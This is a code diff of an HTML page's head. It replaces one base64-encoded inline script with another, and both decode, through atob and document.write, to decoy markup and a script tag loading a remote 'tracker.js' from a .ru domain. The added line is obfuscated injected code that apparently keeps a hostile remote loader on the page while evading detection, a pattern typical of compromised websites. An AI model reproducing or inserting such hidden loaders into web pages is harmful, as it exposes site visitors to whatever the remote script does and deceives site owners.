@@ -3,7 +3,7 @@
 <html lang="en-US">
 <head>
 <script type="text/javascript">
-    let encoded = 'PCEtLSB4bGlhNXd1bXFyNGtidXR1enFscXhodjVibXdueXVzNzRjazEgLS0+IDxkaXYgY2xhc3M9ImNoZWNrX2Zvcl9rODJxMzRkc3hvMDdtdzVvNXc2cm9wN2RkeWhrNWdjMnE2MXciPjwvZGl2PjwhLS0ga216aXd0MWZ5bTF0aTM2c3J6OTZzdHZqN3FpaWZkcmwgLS0+PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPiA8L3NjcmlwdD48ZGl2IGNsYXNzPSJjaGVja19mb3JfenB6MXJrdjQ3eDM2bml6NnpqbDFicXRqcmFtZHN0Ij48L2Rpdj48IS0tIGF4YnNseHg4anM5cnMyNGpmMyAtLT4=';let decoded = atob(encoded);document.write(''+ decoded +'');
+    let encoded = 'PCEtLSBsNmluY291dHd5cHdldzhob2ggLS0+IDxkaXYgY2xhc3M9ImNoZWNrX2Zvcl80enBncDhxb2kwenE2OWdvZjgiPjwvZGl2PjwhLS0gaWF5N290Mjc2eTNzcDEwaGdkNm11ZHpnaWJqcmNzYzNzcXogLS0+PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPiA8L3NjcmlwdD48ZGl2IGNsYXNzPSJjaGVja19mb3JfZmFrYmhvOGM2NDVzY2lscmNzdDhkYXVxcng0ZSI+PC9kaXY+PCEtLSA0M2FlZHo2aGcxZDUwYW1sbGgwIC0tPg==';let decoded = atob(encoded);document.write(''+ decoded +'');
     </script>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
